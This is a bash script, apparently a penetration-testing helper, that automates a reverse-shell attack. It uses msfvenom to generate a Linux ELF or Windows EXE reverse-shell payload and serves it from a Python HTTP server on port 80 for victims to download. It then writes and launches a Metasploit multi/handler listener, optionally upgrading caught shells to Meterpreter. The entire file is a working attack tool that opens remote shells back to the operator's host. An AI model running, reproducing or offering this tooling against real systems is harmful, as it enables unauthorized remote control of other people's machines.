#!/bin/bash

# Default values
PAYLOAD="generic/shell_reverse_tcp"
FORMAT="elf"
FILENAME="rev.elf"
UPGRADE_METERPRETER=false
NO_PAYLOAD=false
PLATFORM="linux"

# Function to display usage
usage() {
    echo "Usage: $0 LHOST LPORT [-m|--to-meterpreter] [-np|--no-payload] [-p|--platform linux|windows] [-o|--filename FILENAME]"
    exit 1
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -m|--to-meterpreter)
            UPGRADE_METERPRETER=true
            shift
            ;;
        -np|--no-payload)
            NO_PAYLOAD=true
            shift
            ;;
        -p|--platform)
            if [[ "$2" == "windows" ]]; then
                FORMAT="exe"
                FILENAME="rev.exe"
                PLATFORM="windows"
            elif [[ "$2" == "linux" ]]; then
                FORMAT="elf"
                FILENAME="rev.elf"
                PLATFORM="linux"
            else
                echo "Error: Platform must be 'linux' or 'windows'"
                usage
            fi
            shift 2
            ;;
        -o|--filename)
            FILENAME="$2"
            shift 2
            ;;
        *)
            if [[ -z "$LHOST" ]]; then
                LHOST="$1"
            elif [[ -z "$LPORT" ]]; then
                LPORT="$1"
            else
                echo "Error: Unknown argument $1"
                usage
            fi
            shift
            ;;
    esac
done

# Validate required arguments
if [[ -z "$LHOST" || -z "$LPORT" ]]; then
    usage
fi

# Create upload directory
mkdir -p /tmp/redshell

# Generate and host payload unless -np is specified
if [[ "$NO_PAYLOAD" == false ]]; then
    terminator --new-tab -e "msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o /tmp/redshell/$FILENAME --platform $PLATFORM && python3 -m http.server 80 --directory /tmp/redshell; exec bash"
fi

# Create Metasploit resource script
cat > /tmp/redshell/listener.rc << EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
EOF

# Add meterpreter upgrade if specified
if [[ "$UPGRADE_METERPRETER" == true ]]; then
    echo "set AutoRunScript post/multi/manage/shell_to_meterpreter" >> /tmp/redshell/listener.rc
fi

echo "run -j" >> /tmp/redshell/listener.rc

# Start Metasploit listener
terminator --new-tab -e "msfconsole -r /tmp/redshell/listener.rc; exec bash"